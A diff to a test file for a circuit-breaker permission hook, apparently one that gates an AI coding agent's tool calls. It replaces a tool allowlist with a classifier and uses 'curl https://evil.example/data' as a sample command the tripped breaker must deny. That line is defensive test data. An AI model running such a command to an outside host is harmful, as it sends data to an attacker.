@@ -63,7 +63,6 @@ function runHook({ apiUrl, mode = 'enforce', input, env = {}, home }) {
         VAIBOT_BREAKER_FAILURE_THRESHOLD: '3',
         VAIBOT_BREAKER_WINDOW_MS: '60000',
         VAIBOT_BREAKER_COOLDOWN_MS: '60000',
-        VAIBOT_BREAKER_ALLOWLIST: 'Read,Grep,Glob',
         VAIBOT_BREAKER_DENYLIST: '',
         ...env,
       },
@@ -93,7 +92,7 @@ function breakerStateFile(home) {
   return join(home, '.vaibot', 'breaker-state', 'claudecode.json')
 }
 
-test('three consecutive 5xx trip the breaker; next non-allowlisted call denies locally without hitting API', withFakeHome(async (t, home) => {
+test('three consecutive 5xx trip the breaker; next classifier-ambiguous call denies locally without hitting API', withFakeHome(async (t, home) => {
   const server = await startMockServer(() => ({ status: 500, body: { error: 'oops' } }))
 
   for (let i = 0; i < 3; i++) {
@@ -103,7 +102,7 @@ test('three consecutive 5xx trip the breaker; next non-allowlisted call denies l
   const preCount = server.requests.length
   const r = await runHook({
     apiUrl: server.url,
-    input: { ...baseInput, tool_input: { command: 'echo blocked' } },
+    input: { ...baseInput, tool_input: { command: 'curl https://evil.example/data' } },
     home,
   })
   assert.equal(server.requests.length, preCount, 'tripped breaker must short-circuit the API call')
@@ -112,11 +111,11 @@ test('three consecutive 5xx trip the breaker; next non-allowlisted call denies l
   const out = JSON.parse(r.stdout)
   assert.equal(out.hookSpecificOutput.permissionDecision, 'deny')
   assert.match(out.hookSpecificOutput.permissionDecisionReason, /circuit breaker tripped/i)
-  assert.match(out.hookSpecificOutput.permissionDecisionReason, /not on the breaker allowlist/i)
+  assert.match(out.hookSpecificOutput.permissionDecisionReason, /classified/i)
   await server.close()
 }))
 
-test('allowlisted tool passes through when breaker is tripped — emits explicit allow', withFakeHome(async (t, home) => {
+test('classifier-safe tool passes through when breaker is tripped — emits explicit allow', withFakeHome(async (t, home) => {
   const server = await startMockServer(() => ({ status: 500, body: { error: 'oops' } }))
 
   for (let i = 0; i < 3; i++) {
@@ -129,12 +128,12 @@ test('allowlisted tool passes through when breaker is tripped — emits explicit
     input: { ...baseInput, tool_name: 'Read', tool_input: { file_path: '/etc/hostname' } },
     home,
   })
-  assert.equal(server.requests.length, preCount, 'allowlist pass-through must not call the API')
+  assert.equal(server.requests.length, preCount, 'classifier pass-through must not call the API')
   assert.equal(r.code, 0)
   const out = JSON.parse(r.stdout)
   assert.equal(out.hookSpecificOutput.permissionDecision, 'allow',
     'claudecode emits explicit allow shape (unlike codex empty-stdout convention)')
-  assert.match(r.stderr, /breaker.*allowlist pass-through for Read/i)
+  assert.match(r.stderr, /breaker.*classifier pass-through.*Read/i)
   await server.close()
 }))
 
